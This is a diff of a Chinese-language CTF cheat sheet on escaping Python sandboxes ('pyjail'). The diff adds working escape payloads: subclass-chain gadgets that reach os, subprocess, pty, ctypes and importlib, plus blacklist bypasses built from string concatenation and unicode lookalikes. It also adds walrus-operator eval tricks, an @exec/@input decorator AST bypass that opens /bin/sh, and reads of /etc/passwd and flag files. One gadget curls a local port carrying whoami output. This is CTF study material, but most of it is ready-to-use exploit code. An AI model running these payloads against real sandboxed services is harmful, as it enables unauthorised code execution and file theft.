@@ -119,11 +119,13 @@ import os
 os.system('ls')
 ```
 
-
-
 ### rce_payload
 
 ```python
+__import__('os').system('cat ./flag.txt')
+__import__('os').system('sh')
+print(open('/flag.txt').read())
+
 #起手式
 os.system('sh')
 os.popen('ls').read()
@@ -170,6 +172,12 @@ open('1.txt').read()
 'sys'+'tem' => 'system'
 '__imp'+'ort__' => '__import__'
 ''.join(['__imp','ort__']) => '__import__'
+
+
+#unicode绕过
+相似 unicode 寻找网站：http://shapecatcher.com/
+可以通过绘制的方式寻找相似字符
+
 
 #下划线被过滤
 dir()[0] => '_'
@@ -273,7 +281,6 @@ exec("import os;os.system('curl xxx')")
 
 
 #过滤运算符
-
 == 用 in 来替换
 or 可以用| + -...-来替换
 e.g:
@@ -384,42 +391,124 @@ class A:
     pass
 ```
 
-### getattr 函数
+### python 继承链
 
-内置函数，用于获取一个对象的属性或者方法。
+```python
+# os
+[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__=="_wrap_close"][0]["system"]("ls")
 
+# subprocess 
+[ x for x in ''.__class__.__base__.__subclasses__() if x.__name__ == 'Popen'][0]('ls')
 
+# builtins
+[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__=="_GeneratorContextManagerBase" and "os" in x.__init__.__globals__ ][0]["__builtins__"]
 
-### pyjail一般思路
+# help
+[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__=="_GeneratorContextManagerBase" and "os" in x.__init__.__globals__ ][0]["__builtins__"]['help']
 
-**RCE方法**
+[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__=="_wrap_close"][0]['__builtins__']
+
+#sys
+[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
+
+[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'_sitebuiltins." in str(x) and not "_Helper" in str(x) ][0]["sys"].modules["os"].system("ls")
+
+#commands (not very common)
+[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "commands" in x.__init__.__globals__ ][0]["commands"].getoutput("ls")
+
+#pty (not very common)
+[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pty" in x.__init__.__globals__ ][0]["pty"].spawn("ls")
+
+#importlib
+[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "importlib" in x.__init__.__globals__ ][0]["importlib"].import_module("os").system("ls")
+[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "importlib" in x.__init__.__globals__ ][0]["importlib"].__import__("os").system("ls")
+
+#imp
+[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'imp." in str(x) ][0]["importlib"].import_module("os").system("ls")
+[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'imp." in str(x) ][0]["importlib"].__import__("os").system("ls")
+
+#pdb
+[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pdb" in x.__init__.__globals__ ][0]["pdb"].os.system("ls")
+
+# ctypes
+[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"].__import__('ctypes').CDLL(None).system('ls /'.encode())
+
+# multiprocessing
+[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"].__import__('multiprocessing').Process(target=lambda: __import__('os').system('curl localhost:9999/?a=`whoami`')).start()
+
+#file
+[ x for x in ''.__class__.__base__.__subclasses__() if x.__name__=="FileLoader" ][0].get_data(0,"/etc/passwd")
+```
+
+### 海象运算符
+
+海象表达式是 Python 3.8 引入的一种新的语法特性，用于在表达式中同时进行赋值和比较操作。
+
+海象表达式的语法形式如下：
 
 ```
-一种是object.__subclasses__()`中找到`os`模块中的类（一般是`<class 'os._wrap_close'>`），另一种是先拿到`__builtins__`，再`__import__('os').system('sh')
+<expression> := <value> if <condition> else <value>
 ```
 
-RCE的payload模板可以通过chrome中hackbar插件SSTI的Show subclasses with tuple拿到；
+借助海象表达式，我们可以通过列表来替代多行代码：
 
-利用第一种方法时，注意本地环境和远程环境中`os`模块中的类的索引（偏移量）可能不相同；
-
-
-
-如上面所介绍的所有默认函数，如`str`、`chr`、`ord`、`dict`、`dir`等。在pyjail的沙箱中，往往`__builtins__`被置为`None`，因此我们不能利用上述的函数。所以一种思路就是我们可以先通过类的基类和子类拿到`__builtins__`，再`__import__('os').system('sh')`进行RCE；
-
-
-
-读取文件
-
-```
-__import__('os').system('cat ./flag.txt')
-print(open('/flag.txt').read())
+```python
+>>> eval('[a:=__import__("os"),b:=a.system("id")]')
+uid=1000(kali) gid=0(root) groups=0(root),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),119(wireshark),122(bluetooth),134(scanner),142(kaboxer)
+[<module 'os' (frozen)>, 0]
 ```
 
-get交互式shell
+###  AST 沙箱绕过
+
+装饰器
+
+利用 payload 如下:
 
 ```
-__import__('os').system('sh')
+@exec
+@input
+class X:
+    pass
 ```
+
+当我们输入上述的代码后, Python 会打开输入,此时我们再输入 payload 就可以成功执行命令.
+
+```
+>>> @exec
+... @input
+... class X:
+...     pass
+... 
+<class '__main__.X'>__import__("os").system("ls")
+```
+
+由于装饰器不会被解析为调用表达式或语句, 因此可以绕过黑名单, 最终传入的 payload 是由 input 接收的, 因此也不会被拦截.
+
+其实这样的话,构造其实可以有很多,比如直接打开 help 函数.
+
+```
+@help
+class X:
+    pass
+```
+
+这样可以直接进入帮助文档:
+
+```
+Help on class X in module __main__:
+
+class X(builtins.object)
+ |  Data descriptors defined here:
+ |  
+ |  __dict__
+ |      dictionary for instance variables (if defined)
+ |  
+ |  __weakref__
+ |      list of weak references to the object (if defined)
+(END)
+```
+
+再次输入 !sh 即可打开 /bin/sh
 
 ### 参考文档
 
@@ -428,4 +517,10 @@ https://zhuanlan.zhihu.com/p/578966149
 https://lazzzaro.github.io/2020/08/21/misc-%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/index.html
 
 https://book.hacktricks.xyz/generic-methodologies-and-resources/python/python-internal-read-gadgets
+
+https://xz.aliyun.com/t/12647?time__1311=GqGxuDRiYiwxlrzG7DyGKqita%2BFTQx%3DoD#toc-15
+
+https://dummykitty.github.io/python/2023/05/30/pyjail-bypass-08-%E7%BB%95%E8%BF%87-AST-%E6%B2%99%E7%AE%B1.html
+
+https://www.mi1k7ea.com/2019/05/31/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%B0%8F%E7%BB%93/#%E8%BF%87%E6%BB%A4-globals
 
